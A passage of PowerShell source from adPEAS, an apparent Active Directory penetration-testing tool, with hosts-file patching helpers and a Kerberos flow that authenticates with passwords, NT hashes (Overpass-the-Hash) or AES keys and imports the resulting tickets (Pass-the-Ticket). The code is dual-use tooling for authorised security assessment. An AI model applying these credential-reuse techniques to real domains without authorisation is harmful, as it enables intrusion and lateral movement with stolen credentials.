                        $innerResult.Success = $true  # Not an error, just already exists
                        return $innerResult
                    }

                    if ($existingEntry -and $Force) {
                        # Remove existing entry
                        $hostsContent = @($hostsContent | Where-Object { $_ -notmatch "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*" })
                        Write-Log "[Add-adPEASHostsEntry] Removed existing entry for $Hostname"
                    }

                    # Add new entry
                    $hostsContent += $entry

                    # Close reader before writing (releases internal buffer reference)
                    $streamReader.Dispose()
                    $streamReader = $null

                    # Reset stream for writing
                    $fileStream.SetLength(0)
                    $fileStream.Position = 0

                    # Write back to hosts file with trailing newline
                    $streamWriter = New-Object System.IO.StreamWriter($fileStream, [System.Text.Encoding]::ASCII, 4096, $true)
                    $streamWriter.Write(($hostsContent -join "`r`n"))
                    $streamWriter.Write("`r`n")  # Trailing newline
                    $streamWriter.Flush()

                    $innerResult.Success = $true
                    $innerResult.Entry = $entry
                    $innerResult.Message = "Added hosts entry: $IPAddress -> $Hostname"
                    Write-Log "[Add-adPEASHostsEntry] $($innerResult.Message)"

                    return $innerResult
                }
                finally {
                    if ($streamWriter) { try { $streamWriter.Dispose() } catch { } }
                    if ($streamReader) { try { $streamReader.Dispose() } catch { } }
                }
            }

            # Track the entry in LDAPContext for cleanup (only if successful)
            if ($Result.Success -and $Result.Entry) {
                if (-not $Script:LDAPContext) {
                    $Script:LDAPContext = @{}
                }
                if (-not $Script:LDAPContext['HostsEntries']) {
                    $Script:LDAPContext['HostsEntries'] = @()
                }
                $Script:LDAPContext['HostsEntries'] += $Hostname
            }

            return $Result
        }
        catch {
            $Result.Message = "Failed to modify hosts file: $_"
            Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
            return $Result
        }
    }
}

<#
.SYNOPSIS
    Removes adPEAS-managed entries from the Windows hosts file.

.DESCRIPTION
    Removes hostname entries that were added by adPEAS.
    Can remove a specific hostname or all adPEAS-managed entries.
    Requires Administrator privileges.

.PARAMETER Hostname
    Optional. Specific hostname to remove.
    If not specified, removes ALL adPEAS-managed entries.

.PARAMETER All
    Remove all adPEAS-managed entries (marked with the adPEAS comment).

.EXAMPLE
    Remove-adPEASHostsEntry -Hostname "dc01.contoso.com"
    Removes the specific entry.

.EXAMPLE
    Remove-adPEASHostsEntry -All
    Removes all adPEAS-managed entries.

.OUTPUTS
    [PSCustomObject] with Success, Message, RemovedCount, and RequiresElevation properties.
#>
function Remove-adPEASHostsEntry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$Hostname,

        [Parameter(Mandatory=$false)]
        [switch]$All
    )

    process {
        $Result = [PSCustomObject]@{
            Success = $false
            Message = ""
            RemovedCount = 0
            RequiresElevation = $false
        }

        # Check if running as Administrator
        if (-not (Test-adPEASAdminPrivileges)) {
            $Result.RequiresElevation = $true
            $Result.Message = "Administrator privileges required to modify hosts file"
            Write-Warning "[Remove-adPEASHostsEntry] $($Result.Message)"
            return $Result
        }

        # Check if there's anything to remove (early exit for tracked entries)
        if (-not $All -and -not $Hostname) {
            if (-not $Script:LDAPContext -or -not $Script:LDAPContext['HostsEntries'] -or $Script:LDAPContext['HostsEntries'].Count -eq 0) {
                $Result.Message = "No entries to remove (no tracked entries and no -Hostname/-All specified)"
                $Result.Success = $true
                return $Result
            }
        }

        try {
            $Result = Invoke-WithHostsFileLock -ScriptBlock {
                param($fileStream)

                $innerResult = [PSCustomObject]@{
                    Success = $false
                    Message = ""
                    RemovedCount = 0
                    RequiresElevation = $false
                }

                $streamReader = $null
                $streamWriter = $null

                try {
                    # Read all content
                    $streamReader = New-Object System.IO.StreamReader($fileStream, [System.Text.Encoding]::ASCII, $true, 4096, $true)
                    $fullContent = $streamReader.ReadToEnd()
                    $hostsContent = @($fullContent -split "`r?`n")
                    $originalCount = $hostsContent.Count

                    if ($All) {
                        # Remove all adPEAS-managed entries
                        $hostsContent = @($hostsContent | Where-Object { $_ -notmatch [regex]::Escape($Script:HostsFileMarker) })
                        $innerResult.RemovedCount = $originalCount - $hostsContent.Count
                        $innerResult.Message = "Removed $($innerResult.RemovedCount) adPEAS-managed entries"
                    }
                    elseif ($Hostname) {
                        # Remove specific hostname (supports IPv4 and IPv6)
                        $escapedHostname = [regex]::Escape($Hostname)
                        $escapedMarker = [regex]::Escape($Script:HostsFileMarker)
                        $pattern = "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*.*$escapedMarker"
                        $hostsContent = @($hostsContent | Where-Object { $_ -notmatch $pattern })
                        $innerResult.RemovedCount = $originalCount - $hostsContent.Count
                        $innerResult.Message = "Removed entry for $Hostname"
                    }
                    else {
                        # Remove entries tracked in LDAPContext
                        foreach ($trackedHost in $Script:LDAPContext['HostsEntries']) {
                            $escapedHostname = [regex]::Escape($trackedHost)
                            $pattern = "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*"
                            $hostsContent = @($hostsContent | Where-Object { $_ -notmatch $pattern })
                        }
                        $innerResult.RemovedCount = $originalCount - $hostsContent.Count
                        $Script:LDAPContext['HostsEntries'] = @()
                        $innerResult.Message = "Removed $($innerResult.RemovedCount) tracked entries"
                    }

                    # Write back to hosts file if changes were made
                    if ($innerResult.RemovedCount -gt 0) {
                        # Close reader before writing
                        $streamReader.Dispose()
                        $streamReader = $null

                        # Reset stream for writing
                        $fileStream.SetLength(0)
                        $fileStream.Position = 0

                        $streamWriter = New-Object System.IO.StreamWriter($fileStream, [System.Text.Encoding]::ASCII, 4096, $true)
                        $streamWriter.Write(($hostsContent -join "`r`n"))
                        $streamWriter.Write("`r`n")  # Trailing newline
                        $streamWriter.Flush()
                    }

                    $innerResult.Success = $true
                    Write-Log "[Remove-adPEASHostsEntry] $($innerResult.Message)"
                    return $innerResult
                }
                finally {
                    if ($streamWriter) { try { $streamWriter.Dispose() } catch { } }
                    if ($streamReader) { try { $streamReader.Dispose() } catch { } }
                }
            }

            return $Result
        }
        catch {
            $Result.Message = "Failed to modify hosts file: $_"
            Write-Warning "[Remove-adPEASHostsEntry] $($Result.Message)"
            return $Result
        }
    }
}

<#
.SYNOPSIS
    Shows current adPEAS-managed hosts entries.

.DESCRIPTION
    Lists all hosts file entries that were added by adPEAS.

.OUTPUTS
    Array of PSCustomObjects with IPAddress, Hostname, and Line properties.
#>
function Get-adPEASHostsEntries {
    [CmdletBinding()]
    param()

    process {
        try {
            $entries = Invoke-WithHostsFileLock -ReadOnly -ScriptBlock {
                param($fileStream)

                $result = @()
                $streamReader = $null

                try {
                    $streamReader = New-Object System.IO.StreamReader($fileStream, [System.Text.Encoding]::ASCII, $true, 4096, $true)
                    $fullContent = $streamReader.ReadToEnd()
                    $hostsContent = @($fullContent -split "`r?`n")

                    foreach ($line in $hostsContent) {
                        if ($line -match [regex]::Escape($Script:HostsFileMarker)) {
                            # Match IPv4 or IPv6 address followed by hostname
                            if ($line -match "^\s*($Script:IPAddressPattern)\s+(\S+)\s*") {
                                $result += [PSCustomObject]@{
                                    IPAddress = $Matches[1]
                                    Hostname = $Matches[2]
                                    Line = $line
                                }
                            }
                        }
                    }

                    return $result
                }
                finally {
                    if ($streamReader) { try { $streamReader.Dispose() } catch { } }
                }
            }

            return $entries
        }
        catch {
            Write-Warning "[Get-adPEASHostsEntries] Failed to read hosts file: $_"
            return @()
        }
    }
}



# ----- Invoke-KerberosAuthFlow.ps1 -----

<#
.SYNOPSIS
    Performs the complete Kerberos authentication flow (TGT -> TGS -> PTT -> LDAP/SMB).

.DESCRIPTION
    This internal helper function encapsulates the complete Kerberos authentication flow:
    1. Request TGT via Invoke-KerberosAuth (using password, hash, or key)
    2. Import TGT via Import-KerberosTicket (Pass-the-Ticket)
    3. Request and import LDAP service ticket (TGS) for LDAP connections
    4. Request and import CIFS service ticket for SMB/SYSVOL access (non-fatal if fails)
    5. Establish LDAP connection using the imported Kerberos ticket

    This function is used internally by Connect-adPEAS to avoid code duplication across different authentication parameter sets (PSCredential, UsernamePassword, NTHash, AES).

.PARAMETER SamAccountName
    The sAMAccountName of the user (without domain prefix).

.PARAMETER Domain
    The target domain FQDN.

.PARAMETER Server
    Optional. Specific Domain Controller to use.

.PARAMETER DCHostname
    The DC hostname for SPN construction (e.g., dc01.contoso.com).

.PARAMETER DCIP
    The DC IP address for KDC connection (bypasses system DNS).

.PARAMETER Password
    Plain text password for password-based authentication.

.PARAMETER NTHash
    NT-Hash for Overpass-the-Hash authentication.

.PARAMETER AES256Key
    AES256 key for Pass-the-Key authentication.

.PARAMETER AES128Key
    AES128 key for Pass-the-Key authentication.

.PARAMETER UseLDAPS
    Use LDAPS instead of LDAP.

.PARAMETER IgnoreSSLErrors
    Ignore SSL certificate errors.

.EXAMPLE
    $Result = Invoke-KerberosAuthFlow -SamAccountName "admin" -Domain "contoso.com" -DCHostname "dc01.contoso.com" -DCIP "10.0.0.1" -Password "P@ssw0rd!"

.OUTPUTS
    [PSCustomObject] with properties:
    - Success: $true if authentication succeeded
    - Connection: The LDAP connection object (if successful)
    - TGTResult: The TGT result object (for auth info tracking)
    - Error: Error message (if failed)

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function Invoke-KerberosAuthFlow {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SamAccountName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$true)]
        [string]$DCHostname,

        [Parameter(Mandatory=$false)]
        [string]$DCIP,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [string]$NTHash,

        [Parameter(Mandatory=$false)]
        [string]$AES256Key,

        [Parameter(Mandatory=$false)]
        [string]$AES128Key,

        [Parameter(Mandatory=$false)]
        [switch]$UseLDAPS,

        [Parameter(Mandatory=$false)]
        [switch]$IgnoreSSLErrors,

        [Parameter(Mandatory=$false)]
        [string]$UserRealm,

        [Parameter(Mandatory=$false)]
        [string]$UserRealmKDC
    )

    begin {
        # Helper function to request and import a service ticket (reduces code duplication)
        function Request-AndImportServiceTicket {
            param(
                [Parameter(Mandatory=$true)]
                [byte[]]$TGTBytes,

                [Parameter(Mandatory=$true)]
                [byte[]]$SessionKeyBytes,

                [Parameter(Mandatory=$true)]
                [int]$SessionKeyType,

                [Parameter(Mandatory=$true)]
                [string]$ServicePrincipalName,

                [Parameter(Mandatory=$true)]
                [string]$TargetDomain,

                [Parameter(Mandatory=$true)]
                [string]$KdcServer,

                [Parameter(Mandatory=$true)]
                [string]$ClientName,

                [Parameter(Mandatory=$false)]
                [switch]$NonFatal
            )

            $ServiceResult = [PSCustomObject]@{
                Success = $false
                TGSResult = $null
                ImportResult = $null
                Error = $null
            }

            # Parse SPN into service name and instance
            $spnParts = $ServicePrincipalName -split '/'
            if ($spnParts.Count -lt 2 -or [string]::IsNullOrEmpty($spnParts[1])) {
                $ServiceResult.Error = "Invalid SPN format: '$ServicePrincipalName' - expected 'service/hostname'"
                return $ServiceResult
            }
            $serviceName = $spnParts[0]
            $serviceInstance = $spnParts[1]

            # Request service ticket
            Write-Log "[Request-AndImportServiceTicket] Requesting TGS for SPN: $ServicePrincipalName"
            $TGSResult = Request-ServiceTicket -TGT $TGTBytes `
                                              -SessionKey $SessionKeyBytes `
                                              -SessionKeyType $SessionKeyType `
                                              -ServicePrincipalName $ServicePrincipalName `
                                              -Domain $TargetDomain `
                                              -DomainController $KdcServer `
                                              -UserName $ClientName

            if (-not $TGSResult -or -not $TGSResult.Success) {
                $ServiceResult.Error = if ($TGSResult.Error) { $TGSResult.Error } else { "TGS request failed" }
                return $ServiceResult
            }

            $ServiceResult.TGSResult = $TGSResult
            Write-Log "[Request-AndImportServiceTicket] Service ticket acquired for $serviceName"

            # Import service ticket
            Write-Log "[Request-AndImportServiceTicket] Importing $serviceName service ticket..."
            $importParams = @{
                TicketBytes    = $TGSResult.TicketBytes
                SessionKey     = $TGSResult.SessionKeyBytes
                SessionKeyType = $TGSResult.SessionKeyType    # Bug fix: was EncryptionType (ticket etype), must be SessionKeyType
                Realm          = $TargetDomain.ToUpper()
                ClientName     = $ClientName
                ServerName     = $serviceName
                ServerInstance = $serviceInstance
            }
            if ($TGSResult.TicketFlags) { $importParams['TicketFlags'] = $TGSResult.TicketFlags }
            if ($TGSResult.AuthTime)    { $importParams['AuthTime']    = $TGSResult.AuthTime }
            if ($TGSResult.StartTime)   { $importParams['StartTime']   = $TGSResult.StartTime }
            if ($TGSResult.EndTime)     { $importParams['EndTime']     = $TGSResult.EndTime }
            if ($TGSResult.RenewTill)   { $importParams['RenewTill']   = $TGSResult.RenewTill }

            $ImportResult = Import-KerberosTicket @importParams

            if (-not $ImportResult -or -not $ImportResult.Success) {
                $ServiceResult.Error = if ($ImportResult.Error) { $ImportResult.Error } else { "Ticket import failed" }
                $ServiceResult.ImportResult = $ImportResult
                return $ServiceResult
            }

            $ServiceResult.ImportResult = $ImportResult
            $ServiceResult.Success = $true
            Write-Log "[Request-AndImportServiceTicket] $serviceName service ticket imported into session"
            return $ServiceResult
        }
    }

    process {
        $Result = [PSCustomObject]@{
            Success = $false
            Connection = $null
            TGTResult = $null
            Error = $null
            ErrorCode = $null  # KDC error code for structured error handling
            IsNetworkError = $false  # True if failure was due to network issues (not auth)
            NetworkErrorServer = $null
            NetworkErrorPort = $null
        }

        try {
            # Use IP address for KDC connection if available (custom DNS scenario)
            # This is required when system DNS cannot resolve the DC hostname
            $KdcTarget = if ($DCIP) {
                Write-Log "[Invoke-KerberosAuthFlow] Using IP for KDC: $DCIP (hostname: $DCHostname)"
                $DCIP
            } else {
                $DCHostname
            }

            # Cross-domain: determine which KDC to use for TGT vs TGS
            # TGT must come from user's realm KDC, TGS from target domain KDC
            $IsCrossDomain = $false
            $TgtKdcTarget = $KdcTarget  # Default: same KDC for everything
            $TgtRealm = $Domain         # Default: target domain as realm

            if ($UserRealm -and $UserRealmKDC) {
                $IsCrossDomain = $true
                $TgtKdcTarget = $UserRealmKDC  # TGT from user's realm KDC
                $TgtRealm = $UserRealm         # User's realm for AS-REQ
                Write-Log "[Invoke-KerberosAuthFlow] Cross-domain: TGT from $TgtKdcTarget (realm: $TgtRealm), TGS from $KdcTarget (realm: $Domain)"
            }

            # ===== Step 0: Test Kerberos port reachability (port 88) =====
            # For cross-domain: test BOTH KDCs (user realm for TGT + target domain for TGS)
            $KdcReachable = $false
            Write-Log "[Invoke-KerberosAuthFlow] Testing port reachability to: $TgtKdcTarget"

            try {
                $TcpClient = New-Object System.Net.Sockets.TcpClient
                $ConnectTask = $TcpClient.BeginConnect($TgtKdcTarget, 88, $null, $null)
                $WaitHandle = $ConnectTask.AsyncWaitHandle

                if ($WaitHandle.WaitOne(2000, $false)) {
                    $TcpClient.EndConnect($ConnectTask)
                    $KdcReachable = $true
                    Write-Log "[Invoke-KerberosAuthFlow] KDC is reachable on port 88"
                }
                $TcpClient.Close()
            } catch {
                Write-Log "[Invoke-KerberosAuthFlow] Port test failed: $_"
            }

            if (-not $KdcReachable) {
                $Result.IsNetworkError = $true
                $Result.NetworkErrorServer = $TgtKdcTarget
                $Result.NetworkErrorPort = 88
                $Result.Error = "Port 88 (Kerberos) unreachable on $TgtKdcTarget"
                throw $Result.Error
            }

            # For cross-domain: also test target domain KDC reachability (needed for TGS)
            if ($IsCrossDomain -and $KdcTarget -ne $TgtKdcTarget) {
                Write-Log "[Invoke-KerberosAuthFlow] Cross-domain: testing target KDC reachability: $KdcTarget"
                $TargetKdcReachable = $false
                try {
                    $TcpClient2 = New-Object System.Net.Sockets.TcpClient
                    $ConnectTask2 = $TcpClient2.BeginConnect($KdcTarget, 88, $null, $null)
                    $WaitHandle2 = $ConnectTask2.AsyncWaitHandle
                    if ($WaitHandle2.WaitOne(2000, $false)) {
                        $TcpClient2.EndConnect($ConnectTask2)
                        $TargetKdcReachable = $true
                        Write-Log "[Invoke-KerberosAuthFlow] Target KDC is reachable on port 88"
                    }
                    $TcpClient2.Close()
                } catch {
                    Write-Log "[Invoke-KerberosAuthFlow] Target KDC port test failed: $_"
                }
                if (-not $TargetKdcReachable) {
                    Write-Log "[Invoke-KerberosAuthFlow] Target KDC unreachable - TGS will likely fail, but continuing with TGT"
                }
            }

            # ===== Step 1: Get TGT via Invoke-KerberosAuth =====
            Write-Log "[Invoke-KerberosAuthFlow] Step 1: Requesting TGT..."
            if ($IsCrossDomain) {
                Write-Log "[Invoke-KerberosAuthFlow] Cross-domain: requesting TGT from $TgtRealm KDC ($TgtKdcTarget)"
            }

            $KerbAuthParams = @{
                UserName = $SamAccountName
                Domain = $TgtRealm           # User's realm (or target domain if same-domain)
                DomainController = $TgtKdcTarget  # User's realm KDC (or target KDC if same-domain)
            }

            # Add authentication material based on what was provided
            # For password-based auth, we implement EType fallback (AES256 -> AES128 -> RC4)
            # For hash/key-based auth, the EType is fixed by the key type
            if ($PSBoundParameters.ContainsKey('Password')) {
                $KerbAuthParams['Password'] = $Password
                Write-Log "[Invoke-KerberosAuthFlow] Using password-based authentication"

                # EType fallback order for password-based auth
                # Try AES256 first (most secure), then AES128, then RC4 (legacy compatibility)
                $ETypeFallbackOrder = @(18, 17, 23)  # AES256, AES128, RC4-HMAC
                $ETypeNames = @{ 18 = "AES256"; 17 = "AES128"; 23 = "RC4-HMAC" }
                $TGTResult = $null
                $LastErrorCode = $null
                $LastError = $null

                foreach ($eType in $ETypeFallbackOrder) {
                    $KerbAuthParams['PreferredEType'] = $eType
                    Write-Log "[Invoke-KerberosAuthFlow] Trying EType $eType ($($ETypeNames[$eType]))..."

                    $TGTResult = Invoke-KerberosAuth @KerbAuthParams

                    if ($TGTResult -and $TGTResult.Success) {
                        Write-Log "[Invoke-KerberosAuthFlow] TGT acquired with EType $eType ($($ETypeNames[$eType]))"
                        break
                    }

                    # Check if error is ETYPE_NOSUPP (14) - try next EType
                    if ($TGTResult -and $TGTResult.ErrorCode -eq $Script:KDC_ERR_ETYPE_NOSUPP) {
                        Write-Log "[Invoke-KerberosAuthFlow] KDC does not support EType $eType ($($ETypeNames[$eType])), trying next..."
                        $LastErrorCode = $TGTResult.ErrorCode
                        $LastError = $TGTResult.Error
                        continue
                    }

                    # Any other error - stop trying (credentials may be wrong, user locked, etc.)
                    $LastErrorCode = $TGTResult.ErrorCode
                    $LastError = $TGTResult.Error
                    Write-Log "[Invoke-KerberosAuthFlow] TGT request failed with error code $LastErrorCode - not retrying with other ETypes"
                    break
                }

                # If all ETYPEs failed, report the last error
                if (-not $TGTResult -or -not $TGTResult.Success) {
                    $ErrorMsg = if ($LastError) { $LastError } else { "Unknown error" }
                    $Result.ErrorCode = $LastErrorCode
                    # Propagate network error info from TGTResult
                    if ($TGTResult -and $TGTResult.IsNetworkError) {
                        $Result.IsNetworkError = $true
                        $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
                        $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
                    }
                    throw "TGT request failed (tried ETypes: AES256, AES128, RC4): $ErrorMsg"
                }
            }
            elseif ($NTHash) {
                $KerbAuthParams['NTHash'] = $NTHash
                Write-Log "[Invoke-KerberosAuthFlow] Using NT-Hash (Overpass-the-Hash) - EType fixed to RC4-HMAC"

                $TGTResult = Invoke-KerberosAuth @KerbAuthParams

                if (-not $TGTResult -or -not $TGTResult.Success) {
                    $ErrorMsg = if ($TGTResult.Error) { $TGTResult.Error } else { "Unknown error" }
                    $Result.ErrorCode = $TGTResult.ErrorCode
                    # Propagate network error info from TGTResult
                    if ($TGTResult -and $TGTResult.IsNetworkError) {
                        $Result.IsNetworkError = $true
                        $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
                        $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
                    }
                    throw "TGT request failed: $ErrorMsg"
                }
            }
            elseif ($AES256Key) {
                $KerbAuthParams['AES256Key'] = $AES256Key
                Write-Log "[Invoke-KerberosAuthFlow] Using AES256 Key (Pass-the-Key) - EType fixed to AES256"

                $TGTResult = Invoke-KerberosAuth @KerbAuthParams

                if (-not $TGTResult -or -not $TGTResult.Success) {
                    $ErrorMsg = if ($TGTResult.Error) { $TGTResult.Error } else { "Unknown error" }
                    $Result.ErrorCode = $TGTResult.ErrorCode
                    # Propagate network error info from TGTResult
                    if ($TGTResult -and $TGTResult.IsNetworkError) {
                        $Result.IsNetworkError = $true
                        $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
                        $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
                    }
                    throw "TGT request failed: $ErrorMsg"
                }
            }
            elseif ($AES128Key) {
                $KerbAuthParams['AES128Key'] = $AES128Key
                Write-Log "[Invoke-KerberosAuthFlow] Using AES128 Key (Pass-the-Key) - EType fixed to AES128"

                $TGTResult = Invoke-KerberosAuth @KerbAuthParams

                if (-not $TGTResult -or -not $TGTResult.Success) {
                    $ErrorMsg = if ($TGTResult.Error) { $TGTResult.Error } else { "Unknown error" }
                    $Result.ErrorCode = $TGTResult.ErrorCode
                    # Propagate network error info from TGTResult
                    if ($TGTResult -and $TGTResult.IsNetworkError) {
                        $Result.IsNetworkError = $true
                        $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
                        $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
                    }
                    throw "TGT request failed: $ErrorMsg"
                }
            }
            else {
                throw "No authentication material provided (Password, NTHash, AES256Key, or AES128Key required)"
            }

            # Validate SessionKeyBytes - required for TGS requests
            if (-not $TGTResult.SessionKeyBytes -or $TGTResult.SessionKeyBytes.Length -eq 0) {
                throw "TGT request succeeded but SessionKeyBytes is missing or empty (AS-REP decryption may have failed)"
            }

            Write-Log "[Invoke-KerberosAuthFlow] TGT acquired successfully"
            $Result.TGTResult = $TGTResult

            # ===== Step 2: Import TGT via Pass-the-Ticket =====
            Write-Log "[Invoke-KerberosAuthFlow] Step 2: Importing TGT (Pass-the-Ticket)..."

            # Import TGT first (allows Windows to request additional service tickets if needed)
            # For cross-domain: TGT realm is user's realm, not target domain
            $pttParams = @{
                TicketBytes    = $TGTResult.TicketBytes
                SessionKey     = $TGTResult.SessionKeyBytes
                SessionKeyType = $TGTResult.EncryptionType
                Realm          = $TgtRealm.ToUpper()
                ClientName     = $SamAccountName
                ServerName     = "krbtgt"
                ServerInstance = $TgtRealm.ToUpper()
                AuthTime       = $TGTResult.AuthTime
                StartTime      = $TGTResult.StartTime
                EndTime        = $TGTResult.EndTime
                RenewTill      = $TGTResult.RenewTill
            }
            if ($TGTResult.TicketFlags) { $pttParams['TicketFlags'] = $TGTResult.TicketFlags }

            $PTTResult = Import-KerberosTicket @pttParams

            if (-not $PTTResult -or -not $PTTResult.Success) {
                $ErrorMsg = if ($PTTResult.Error) { $PTTResult.Error } else { "Unknown error" }
                throw "TGT import failed: $ErrorMsg"
            }
            Write-Log "[Invoke-KerberosAuthFlow] TGT imported into session"

            # ===== Step 3: Request and import LDAP service ticket =====
            # For cross-domain: we request TGS from the TARGET domain KDC (not user's realm KDC)
            # The target KDC validates the cross-realm TGT via trust relationship
            # If this fails (referral needed), Windows PTT handles it natively when we connect LDAP
            Write-Log "[Invoke-KerberosAuthFlow] Step 3: Requesting and importing LDAP service ticket..."

            $LDAPServiceSPN = "ldap/$DCHostname"
            $TgsKdcServer = $KdcTarget  # Always target domain KDC for TGS
            if ($IsCrossDomain) {
                Write-Log "[Invoke-KerberosAuthFlow] Cross-domain: requesting TGS from target KDC ($KdcTarget) for SPN $LDAPServiceSPN"
            }

            $LDAPTicketResult = Request-AndImportServiceTicket -TGTBytes $TGTResult.TicketBytes `
                                                               -SessionKeyBytes $TGTResult.SessionKeyBytes `
                                                               -SessionKeyType $TGTResult.EncryptionType `
                                                               -ServicePrincipalName $LDAPServiceSPN `
                                                               -TargetDomain $Domain `
                                                               -KdcServer $TgsKdcServer `
                                                               -ClientName $SamAccountName

            if (-not $LDAPTicketResult.Success) {
                if ($IsCrossDomain) {
                    # Cross-domain TGS failure is expected (no referral chasing implemented)
                    # Fall through to LDAP connect - Windows may handle it natively via PTT
                    Write-Log "[Invoke-KerberosAuthFlow] Cross-domain: TGS failed ($($LDAPTicketResult.Error)) - Windows PTT may handle cross-realm TGS natively"
                } else {
                    throw "LDAP service ticket failed: $($LDAPTicketResult.Error)"
                }
            } else {
                Write-Log "[Invoke-KerberosAuthFlow] LDAP service ticket acquired and imported"
            }

            # ===== Step 4: Request and import CIFS service ticket (for SMB/SYSVOL access) =====
            Write-Log "[Invoke-KerberosAuthFlow] Step 4: Requesting CIFS service ticket for SMB access..."

            $CIFSServiceSPN = "cifs/$DCHostname"
            $CIFSTicketResult = Request-AndImportServiceTicket -TGTBytes $TGTResult.TicketBytes `
                                                               -SessionKeyBytes $TGTResult.SessionKeyBytes `
                                                               -SessionKeyType $TGTResult.EncryptionType `
                                                               -ServicePrincipalName $CIFSServiceSPN `
                                                               -TargetDomain $Domain `
                                                               -KdcServer $TgsKdcServer `
                                                               -ClientName $SamAccountName `
                                                               -NonFatal

            if (-not $CIFSTicketResult.Success) {
                # CIFS ticket failure is non-fatal - LDAP still works, just SMB/SYSVOL won't
                Write-Log "[Invoke-KerberosAuthFlow] CIFS service ticket failed (SMB access may not work): $($CIFSTicketResult.Error)"
            }
            else {
                Write-Log "[Invoke-KerberosAuthFlow] CIFS service ticket acquired and imported"
            }

            # ===== Step 5: Connect to LDAP using Kerberos =====
            # NOTE: On non-domain-joined machines, the imported Kerberos ticket may NOT be automatically used by System.DirectoryServices.DirectoryEntry.
            # In this case, we return a specific error to trigger SimpleBind fallback.
            Write-Log "[Invoke-KerberosAuthFlow] Step 5: Establishing LDAP connection with Kerberos..."

            # Check if hosts file was patched - required for Kerberos SPN matching when using custom DNS without hosts file patching
            $HostsPatched = $Script:LDAPContext -and $Script:LDAPContext['EarlyHostsPatched']
            $UsingCustomDns = $Script:LDAPContext -and $Script:LDAPContext['DnsServer']

            if ($UsingCustomDns -and -not $HostsPatched) {
                Write-Log "[Invoke-KerberosAuthFlow] WARNING: Custom DNS active but hosts file not patched"
                Write-Log "[Invoke-KerberosAuthFlow] Kerberos tickets were obtained but may not be usable"
            }

            $ConnParams = @{}
            $ConnParams['Domain'] = $Domain
            # For Kerberos authentication, we MUST connect to the DC hostname that matches the SPN
            # (e.g., ldap/srv-dc.praxis.local). Connecting to the domain name won't work because
            # Windows can't match the SPN. Use explicit Server if provided, otherwise use DCHostname.
            if ($Server) {
                $ConnParams['Server'] = $Server
            } else {
                $ConnParams['Server'] = $DCHostname
                Write-Log "[Invoke-KerberosAuthFlow] Using DC hostname for LDAP: $DCHostname (required for Kerberos SPN matching)"
            }
            if ($UseLDAPS) { $ConnParams['UseLDAPS'] = $true }
            $ConnParams['IgnoreSSLErrors'] = $IgnoreSSLErrors
            # No Credential - attempts to use Kerberos ticket from session

            $Connection = Connect-LDAP @ConnParams

            if ($Connection) {
                # Verify we actually connected with the expected identity. On non-domain-joined machines, LDAP might fall back to anonymous or fail silently
                if ($Connection.AuthenticatedUser -and $Connection.AuthenticatedUser -notmatch '^\[') {
                    Write-Log "[Invoke-KerberosAuthFlow] Kerberos authentication completed successfully"
                    $Result.Success = $true
                    $Result.Connection = $Connection
                }
                else {
                    # Connection succeeded but identity is unknown or anonymous. This typically means the Kerberos ticket wasn't used
                    Write-Log "[Invoke-KerberosAuthFlow] LDAP connected but Kerberos ticket may not have been used"
                    throw "LDAP connection established but Kerberos ticket not used (non-domain-joined machine?)"
                }
            }
            else {
                # LDAP connection failed - determine the cause
                # Cross-realm (user account in a different realm than the target) is the most
                # specific case: adPEAS does not chase cross-realm Kerberos referrals (see Step 3),
                # and Windows cannot obtain the referral natively when a custom DNS server is in use
                # because the DC-locator SRV records are not resolvable. -NTHash/-AES have no NTLM
                # fallback, so this fails hard. Name the real cause instead of a generic ticket error.
                if ($UserRealm -and $UserRealm -ne $Domain) {
                    throw ("Cross-realm Kerberos: the account is in realm '$UserRealm' but the target domain is " +
                           "'$Domain'. A TGT was obtained from '$UserRealm', but the cross-realm referral to '$Domain' " +
                           "could not be completed - adPEAS does not chase Kerberos referrals, so the final service " +
                           "ticket must be obtained by the Windows stack. The adPEAS -DnsServer parameter only affects " +
                           "adPEAS's own queries, NOT the Windows DC-locator, so Windows cannot resolve the KDC SRV " +
                           "records for both realms. Fixes, in order of preference: " +
                           "(1) set the Windows OS DNS to a server that resolves BOTH realms - then Windows chases the " +
                           "referral natively and this exact command works (hosts-file patching cannot substitute, it " +
                           "has no SRV records); " +
                           "(2) authenticate with an account that lives in '$Domain' (same-realm Kerberos, no referral); " +
                           "(3) supply a plaintext password instead of a hash so NTLM/SimpleBind can traverse the trust " +
                           "(-NTHash/-AES are Kerberos-only and have no NTLM fallback).")
                }
                # Check if this is a hostname resolution issue (custom DNS without hosts patching)
                elseif ($UsingCustomDns -and -not $HostsPatched) {
                    # TGT, TGS, PTT all succeeded but LDAP failed
                    # This is almost certainly because Windows can't resolve the DC hostname
                    # to use the Kerberos ticket (SPN matching requires hostname resolution)
                    $DnsHint = "Kerberos tickets obtained successfully, but LDAP connection failed. " +
                               "This is likely because Windows cannot resolve '$DCHostname' via system DNS. " +
                               "The Kerberos ticket was issued for SPN 'ldap/$DCHostname' but Windows cannot " +
                               "match it without hostname resolution. Use -PatchHostsFile to enable Kerberos authentication, " +
                               "or the connection will fall back to SimpleBind."
                    throw $DnsHint
                }
                else {
                    throw "LDAP connection failed after ticket import (Kerberos ticket not usable on this system)"
                }
            }
        }
        catch {
            $Result.Error = $_.Exception.Message
            Write-Log "[Invoke-KerberosAuthFlow] Authentication failed: $($Result.Error)"
        }

        return $Result
    }
}



# ----- Parse-RegistryPol.ps1 -----

<#
.SYNOPSIS
    Parses a GPO Registry.pol file (PReg binary format) into individual registry value records.

.DESCRIPTION
